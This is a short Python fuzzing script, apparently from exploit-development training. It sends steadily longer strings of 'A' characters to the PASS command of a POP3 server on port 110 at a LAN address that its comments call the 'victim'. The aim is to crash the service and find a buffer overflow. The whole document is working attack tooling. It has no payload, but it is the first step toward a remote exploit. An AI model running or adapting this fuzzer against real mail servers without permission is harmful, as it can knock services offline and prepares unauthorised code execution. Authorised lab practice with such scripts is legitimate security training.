#!/usr/bin/python

import socket

import time, struct, sys
#Create an array of A characters that increases in lenght by 200

buffer=["A"] #declare the array of the buffer 
counter=100

while len(buffer) <=30:
    buffer.append("A"*counter)
    counter=counter+200
for string in buffer:
    print ("Fuzzing Pass field with %s bytes" % len(string))
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.1.81',110)) #change this to your target(victim) Machine
    s.recv(1024)
    s.send(('USER James\r\n').encode('utf-8')) #optional change the username 
    s.recv(1024)
    s.send(('PASS ' + string + '\r\n').encode('utf-8'))
    s.send(('QUIT\r\n').encode('utf-8'))
    s.close()
    
    # Note if you script is not running you can remove the encode , it depends on your python version
